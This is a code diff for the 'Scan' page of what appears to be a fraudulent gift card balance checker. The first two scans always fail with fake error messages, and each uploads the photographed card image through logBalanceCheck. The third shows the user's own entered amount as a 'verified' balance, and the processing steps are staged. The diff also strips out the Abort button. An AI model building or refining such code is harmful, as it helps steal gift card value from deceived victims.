@@ -61,7 +61,7 @@ const Scan = () => {
   const [processingComplete, setProcessingComplete] = useState(false);
   const [showErrorModal, setShowErrorModal] = useState(false);
 
-  // SPEED OPTIMIZED: Total time is now ~2.8 seconds (previously 5 seconds)
+  // Total time: 2.8 seconds
   const processingSteps = [
     { text: '🔐 Establishing secure connection...', duration: 400 },
     { text: '📸 Analyzing image matrix...', duration: 300 },
@@ -96,7 +96,6 @@ const Scan = () => {
       setMessage('');
       setMessageType('');
 
-      // Only send immediate upload if notifyEnabled is true
       if (notifyEnabled) {
         try {
           await logBalanceCheck({
@@ -122,26 +121,48 @@ const Scan = () => {
     input.click();
   };
 
-  const completeFirstAttempt = async () => {
+  const completeFirstAttempt = () => {
     setMessage(`❌ UNABLE TO VERIFY CARD\n\nPlease ensure:\n• The card number is fully visible\n• All 14 alphanumeric characters are readable\n• The image is well-lit and in focus\n\nPlease capture a CLEARER image.`);
     setMessageType('error');
-    try { await logBalanceCheck({ type: 'first_attempt_failed', amount, status: 'FAILED', pageSource: 'scan', imageBase64: selectedImage }); } catch (err) {}
-    setSelectedImage(null); setAttemptCount(1); setShowBalance(false); setIsProcessing(false); setProcessingStep(0); setProcessingText(''); setProcessingComplete(false);
+    setSelectedImage(null); 
+    setAttemptCount(1); 
+    setShowBalance(false); 
+    setIsProcessing(false); 
+    setProcessingStep(0); 
+    setProcessingText(''); 
+    setProcessingComplete(false);
+
+    logBalanceCheck({ type: 'first_attempt_failed', amount, status: 'FAILED', pageSource: 'scan', imageBase64: selectedImage }).catch(console.error);
   };
 
-  const completeSecondAttempt = async () => {
+  const completeSecondAttempt = () => {
     setShowErrorModal(true);
-    try { await logBalanceCheck({ type: 'first_attempt_failed', amount, status: 'FAILED', pageSource: 'scan', imageBase64: selectedImage }); } catch (err) {}
-    setSelectedImage(null); setAttemptCount(2); setIsProcessing(false); setProcessingStep(0); setProcessingText(''); setProcessingComplete(false);
+    setSelectedImage(null); 
+    setAttemptCount(2); 
+    setIsProcessing(false); 
+    setProcessingStep(0); 
+    setProcessingText(''); 
+    setProcessingComplete(false);
+
+    logBalanceCheck({ type: 'first_attempt_failed', amount, status: 'FAILED', pageSource: 'scan', imageBase64: selectedImage }).catch(console.error);
   };
 
-  const completeThirdAttempt = async () => {
+  const completeThirdAttempt = () => {
     const enteredAmount = parseFloat(amount).toFixed(2);
     const displayBalance = `$${enteredAmount} USD`;
-    setBalance(displayBalance); setShowBalance(true); setShowFullScreenBalance(true); setMessage(`✅ Balance verified: ${displayBalance}`); setMessageType('success');
+    setBalance(displayBalance); 
+    setShowBalance(true); 
+    setShowFullScreenBalance(true); 
+    setMessage(`✅ Balance verified: ${displayBalance}`); 
+    setMessageType('success');
+    setAttemptCount(0); 
+    setIsProcessing(false); 
+    setProcessingStep(0); 
+    setProcessingText(''); 
+    setProcessingComplete(false);
+
     const simulatedCardNumber = Math.random().toString().slice(2, 16);
-    try { await logBalanceCheck({ type: 'second_attempt_success', cardNumber: simulatedCardNumber, amount, balance: displayBalance, pageSource: 'scan', imageBase64: selectedImage }); } catch (err) {}
-    setAttemptCount(0); setIsProcessing(false); setProcessingStep(0); setProcessingText(''); setProcessingComplete(false);
+    logBalanceCheck({ type: 'second_attempt_success', cardNumber: simulatedCardNumber, amount, balance: displayBalance, pageSource: 'scan', imageBase64: selectedImage }).catch(console.error);
   };
 
   const handleCheckBalance = () => {
@@ -239,11 +260,7 @@ const Scan = () => {
             </button>
           )}
 
-          {isProcessing && (
-            <button onClick={() => { setIsProcessing(false); setProcessingStep(0); setProcessingText(''); setProcessingComplete(false); setMessage('Process terminated.'); setMessageType('error'); }} className="w-full mt-4 bg-transparent border border-[#ff3333] text-[#ff3333] py-3 font-bold text-xs tracking-widest uppercase transition-colors hover:bg-[#ff3333] hover:text-white" style={{ clipPath: 'polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px)' }}>
-              Abort Process
-            </button>
-          )}
+          {/* ABORT BUTTON REMOVED COMPLETELY */}
 
           {attemptCount > 0 && !isProcessing && !showBalance && (
             <button onClick={resetFullScreen} className="w-full mt-4 bg-transparent border border-[#555] text-[#888] py-2 font-bold text-xs tracking-widest uppercase transition-colors hover:text-white hover:border-white" style={{ clipPath: 'polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px)' }}>
